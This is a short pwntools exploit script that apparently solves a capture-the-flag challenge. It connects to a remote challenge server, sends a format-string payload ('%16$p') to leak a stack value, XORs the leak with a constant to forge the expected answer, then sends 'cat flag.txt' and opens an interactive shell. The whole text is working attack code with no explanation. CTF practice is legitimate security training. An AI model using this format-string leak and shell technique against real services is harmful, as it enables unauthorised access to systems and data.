from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'new-window']

binary = './chall/app'
elf = context.binary = ELF(binary)
libc = elf.libc

p = remote('pwn.dctf.si', 13373)

p.sendlineafter(b'Hello, feeling lucky? ', b'%16$p')
leak = int(p.recvuntil(b'?!')[2:-2].decode(), 16)
fakme = leak ^ 0x1337c0dedeadbeef
p.sendline(str(fakme).encode())

p.sendline(b"cat flag.txt")

p.interactive()
